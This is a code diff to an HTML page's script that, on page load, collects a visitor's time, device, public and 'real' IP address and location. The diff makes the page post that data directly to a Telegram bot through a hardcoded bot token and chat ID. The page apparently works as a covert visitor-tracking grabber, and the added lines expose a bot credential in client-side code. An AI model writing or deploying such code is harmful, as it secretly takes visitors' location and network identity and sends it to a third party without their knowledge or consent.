@@ -63,6 +63,9 @@
   </div>
 
   <script>
+    const TELEGRAM_BOT_TOKEN = '7334352289:AAEjvK_tfGOdVe668Cv-zp56M_IBW_olt44'; // <-- Thay bằng bot thật
+    const TELEGRAM_CHAT_ID = '-1002762675624';
+
     const info = {
       time: new Date().toLocaleString(),
       device: '',
@@ -145,22 +148,29 @@
       `.trim();
     }
 
-    async function sendToServer() {
+    async function sendToTelegram() {
       const text = getCaption();
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
       try {
-        const response = await fetch('/api/sendTelegram', {
+        const response = await fetch(url, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ message: text }),
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text,
+            parse_mode: 'HTML'
+          }),
         });
+
+        const data = await response.json();
         if (!response.ok) {
-          const errorData = await response.json();
-          console.error('Lỗi khi gửi Telegram:', errorData);
+          console.error('Lỗi gửi Telegram:', data);
         } else {
-          console.log('Gửi Telegram thành công');
+          console.log('✅ Gửi thành công:', data);
         }
-      } catch (error) {
-        console.error('Lỗi mạng hoặc fetch:', error);
+      } catch (err) {
+        console.error('Lỗi mạng:', err);
       }
     }
 
@@ -169,7 +179,7 @@
       await getPublicIP();
       await getRealIP();
       await getLocation();
-      await sendToServer();
+      await sendToTelegram();
     }
 
     main();
